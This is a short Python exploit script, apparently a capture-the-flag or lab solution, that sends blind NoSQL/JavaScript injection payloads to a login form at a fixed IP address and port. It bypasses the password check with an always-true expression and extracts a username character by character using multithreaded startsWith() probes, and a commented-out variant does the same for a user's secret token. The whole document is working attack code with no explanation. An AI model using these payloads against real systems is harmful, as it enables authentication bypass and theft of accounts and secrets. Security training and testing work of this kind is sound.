import requests,string
from concurrent.futures import ThreadPoolExecutor, as_completed

def check(payload):
    session = requests.session()

    burp0_url = "http://83.136.255.10:33460/index.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://83.136.255.10:33460", "Connection": "keep-alive", "Referer": "http://83.136.255.10:33460/", "Upgrade-Insecure-Requests": "1", "DNT": "1", "Sec-GPC": "1", "Priority": "u=0, i"}
    burp0_data = {"username": "\" ||(this.username.startsWith(\""+payload+"\"))|| \"", "password": "\" || true || \""}
    # burp0_data = {"username": "\" ||(this.username == \"bmdyy\") && (this.token.startsWith(\""+payload+"\"))|| \"", "password": "sleep"}
    text = session.post(burp0_url, headers=burp0_headers, data=burp0_data).text
    if "Nothing to see here" in text:
        return payload
    else:
        return False
    

executor = ThreadPoolExecutor(max_workers=10)
guesschar = string.printable
guessed = ""

while True:
    print("==========================")
    all_task = []
    noResult = True
    for x in guesschar:
        task = executor.submit(check, guessed+x)
        all_task.append(task)

    for future in as_completed(all_task):
        if future.result():
            guessed = future.result()
            noResult = False
            print(guessed)

    if noResult:
        break